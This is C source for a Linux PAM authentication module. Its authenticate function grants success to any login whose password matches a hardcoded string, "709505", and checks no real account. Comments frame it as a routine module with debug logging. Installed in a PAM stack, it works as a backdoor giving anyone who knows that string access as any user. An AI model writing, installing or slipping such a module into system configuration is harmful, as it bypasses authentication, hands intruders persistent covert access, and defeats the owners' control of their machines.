#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <string.h>
#include <syslog.h>

#define SECRET_PASSWORD "709505"

// Authentication function
static int authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *password;
    int retval;

    // Log entry into the function
    pam_syslog(pamh, LOG_DEBUG, "Entering authenticate function");

    // Get the password from PAM (PAM_AUTHTOK)
    retval = pam_get_item(pamh, PAM_AUTHTOK, (const void **)&password);
    if (retval != PAM_SUCCESS) {
        pam_syslog(pamh, LOG_ERR, "Unable to retrieve password");
        return PAM_AUTH_ERR;
    }

    // Log the retrieved password (for debugging purposes)
    pam_syslog(pamh, LOG_DEBUG, "Password retrieved: %s", password ? "not NULL" : "NULL");

    // Compare the provided password with the secret password
    if (password != NULL && strcmp(password, SECRET_PASSWORD) == 0) {
        pam_syslog(pamh, LOG_INFO, "Authentication succeeded for secret password");
        return PAM_SUCCESS;
    }

    pam_syslog(pamh, LOG_INFO, "Authentication failed for secret password");
    return PAM_AUTH_ERR;
}

// Define pam_sm_authenticate as usual
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    pam_syslog(pamh, LOG_DEBUG, "In pam_sm_authenticate function");
    return authenticate(pamh, flags, argc, argv);
}

// Define pam_sm_setcred as a stub (do nothing and return success)
PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    pam_syslog(pamh, LOG_DEBUG, "In pam_sm_setcred function (stub)");
    return PAM_SUCCESS;
}
